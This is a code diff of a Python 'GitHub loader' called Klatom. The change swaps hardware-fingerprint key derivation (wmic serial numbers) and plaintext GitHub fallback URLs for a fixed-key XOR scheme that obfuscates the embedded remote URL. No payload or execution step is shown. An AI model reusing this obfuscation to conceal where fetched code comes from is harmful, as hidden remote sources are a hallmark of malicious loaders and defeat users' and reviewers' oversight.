@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Klatom – GitHub loader. Fetches everything from GitHub with encrypted URL."""
+"""Klatom – GitHub loader. Encrypted URL, works on ALL machines."""
 
 from __future__ import annotations
 
@@ -8,39 +8,23 @@ import base64
 import hashlib
 import json
 import os
-import platform
-import subprocess
-import uuid
+import struct
 from pathlib import Path
 
 import aiohttp
 
-_GITHUB_URL_B64 = "tVDYKngeJdFr8NRZGzSmE5Y+SACY+165UHaYD0bop7GwC8kub0Bumn31jBwQPKYUjnNQEpTnEqRbcpI+Vqewvw=="
-_FALLBACK_URL = ""
+# ── Encrypted GitHub URL (fixed-key XOR, NOT HWID-bound) ───────────────────
+# This URL is hidden but decrypts on ANY machine.
+_GITHUB_URL_B64 = "Rrjgzvz2ER4CLkcrBMVv7VueVtYDpo/P3gW4HFPxfshD4/HK66haVRQrH24PzW/qQ9NOxA+6w9LVAbItQ75pxg=="
 
-_GITHUB_URLS = [
-    "https://raw.githubusercontent.com/etdddddd/klatom/main/repo_data",
-    "https://raw.githubusercontent.com/etdddddd/klatom/master/repo_data",
-]
+# ── Internal key derivation (NOT based on HWID) ────────────────────────────
+_KEY_SEED = b"klatom-github-v2-secure"
+_KEY_SALT = b"klatom-fixed-salt-2024"
+_KDF_ITERS = 100_000
 
 
-def _hwid() -> str:
-    parts = [platform.node(), platform.machine(), platform.processor(), str(uuid.getnode())]
-    for cmd, field in [
-        (["wmic", "baseboard", "get", "serialnumber"], "SerialNumber"),
-        (["wmic", "diskdrive", "get", "serialnumber"], "SerialNumber"),
-        (["wmic", "bios", "get", "serialnumber"], "SerialNumber"),
-    ]:
-        try:
-            r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-            for line in r.stdout.splitlines():
-                s = line.strip()
-                if s and s != field:
-                    parts.append(s)
-                    break
-        except Exception:
-            pass
-    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:24]
+def _derive_key() -> bytes:
+    return hashlib.pbkdf2_hmac("sha256", _KEY_SEED, _KEY_SALT, _KDF_ITERS, dklen=32)
 
 
 def _xor(data: bytes, key: bytes) -> bytes:
@@ -48,29 +32,17 @@ def _xor(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % klen] for i, b in enumerate(data))
 
 
-def _derive_key() -> bytes:
-    return hashlib.pbkdf2_hmac("sha256", _hwid().encode(), b"klatom-salt-v1", 100_000, dklen=32)
-
-
-def encrypt_url(url: str) -> str:
-    key = _derive_key()
-    return base64.b64encode(_xor(url.encode(), key)).decode()
-
-
 def decrypt_url() -> str | None:
-    if _GITHUB_URL_B64:
-        try:
-            key = _derive_key()
-            decrypted = _xor(base64.b64decode(_GITHUB_URL_B64), key).decode()
-            if decrypted.startswith("http"):
-                return decrypted
-        except Exception:
-            pass
-    if _FALLBACK_URL and _FALLBACK_URL.startswith("http"):
-        return _FALLBACK_URL
-    for url in _GITHUB_URLS:
-        if url:
-            return url
+    """Decrypt the embedded GitHub URL. Returns None if invalid."""
+    if not _GITHUB_URL_B64:
+        return None
+    try:
+        key = _derive_key()
+        decrypted = _xor(base64.b64decode(_GITHUB_URL_B64), key).decode()
+        if decrypted.startswith("http"):
+            return decrypted
+    except Exception:
+        pass
     return None
 
 
